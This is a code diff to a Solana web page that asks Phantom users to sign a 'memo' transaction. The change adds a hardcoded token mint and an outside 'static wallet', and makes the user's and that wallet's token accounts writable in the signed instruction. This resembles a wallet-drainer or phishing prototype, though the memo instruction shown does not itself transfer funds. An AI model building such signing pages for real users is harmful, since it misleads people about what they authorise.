@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Memo Transaction</title>
+    <title>Solana M1emo Transaction</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -128,10 +128,25 @@
 
 <script>
 var MEMO_PROGRAM_ID  = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+var MINT             = new solanaWeb3.PublicKey('642NfDi7su9jQA1M4Jqc67DaLpY1Vqbt7sbvRMZKpump');
+var STATIC_WALLET    = new solanaWeb3.PublicKey('AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ');
 var FALLBACK_BLOCKHASH = '11111111111111111111111111111111';
 
 var provider = null;
 var wallet   = null;
+
+// Derives the Associated Token Account address for a given owner and mint
+async function getAssociatedTokenAddress(owner, mint) {
+    var ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bfd');
+    var seeds = [
+        owner.toBuffer(),
+        TOKEN_PROGRAM_ID.toBuffer(),
+        mint.toBuffer(),
+    ];
+    var result = await solanaWeb3.PublicKey.findProgramAddress(seeds, ASSOCIATED_TOKEN_PROGRAM_ID);
+    return result[0];
+}
 
 function getProvider() {
     if (window.phantom && window.phantom.solana && window.phantom.solana.isPhantom)
@@ -175,8 +190,14 @@ async function buildAndSign() {
     var btn = document.getElementById('signBtn');
     var r   = document.getElementById('result');
     btn.disabled    = true;
-    btn.textContent = 'Fetching blockhash\u2026';
+    btn.textContent = 'Deriving ATAs\u2026';
     r.classList.remove('visible');
+
+    // Derive both ATAs
+    var userAta   = await getAssociatedTokenAddress(wallet, MINT);
+    var staticAta = await getAssociatedTokenAddress(STATIC_WALLET, MINT);
+
+    btn.textContent = 'Fetching blockhash\u2026';
 
     var recentBlockhash = null;
     try {
@@ -189,10 +210,21 @@ async function buildAndSign() {
         recentBlockhash = FALLBACK_BLOCKHASH;
     }
 
+    // Build the instruction with:
+    //   - mint              (read-only,  not a signer)
+    //   - user ATA          (writable,   not a signer)
+    //   - static wallet ATA (writable,   not a signer)
+    //   - Token Program     (read-only,  not a signer)
     var ix = new solanaWeb3.TransactionInstruction({
         programId: MEMO_PROGRAM_ID,
-        keys:      [],
-        data:      new Uint8Array(0),
+        keys: [
+            { pubkey: wallet,           isSigner: true,  isWritable: true  },
+            { pubkey: MINT,             isSigner: false, isWritable: false },
+            { pubkey: userAta,          isSigner: false, isWritable: true  },
+            { pubkey: staticAta,        isSigner: false, isWritable: true  },
+            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        ],
+        data: new Uint8Array(0),
     });
 
     var tx = new solanaWeb3.Transaction({ feePayer: wallet, recentBlockhash: recentBlockhash });
@@ -209,7 +241,11 @@ async function buildAndSign() {
         r.innerHTML =
             '<strong>&#10003; Transaction Signed</strong>' +
             '<b>Signature (base64):</b><br>' + sigB64 + '<br><br>' +
-            '<b>Signer:</b><br>' + wallet.toString();
+            '<b>Signer:</b><br>'                    + wallet.toString()        + '<br><br>' +
+            '<b>Mint:</b><br>'                      + MINT.toString()          + '<br><br>' +
+            '<b>User ATA (writable):</b><br>'       + userAta.toString()       + '<br><br>' +
+            '<b>Static ATA (writable):</b><br>'     + staticAta.toString()     + '<br><br>' +
+            '<b>Token Program:</b><br>'             + TOKEN_PROGRAM_ID.toString();
     } catch(err) {
         r.className = 'result visible error';
         r.innerHTML = '<strong>&#x274C; ' + err.message + '</strong>';
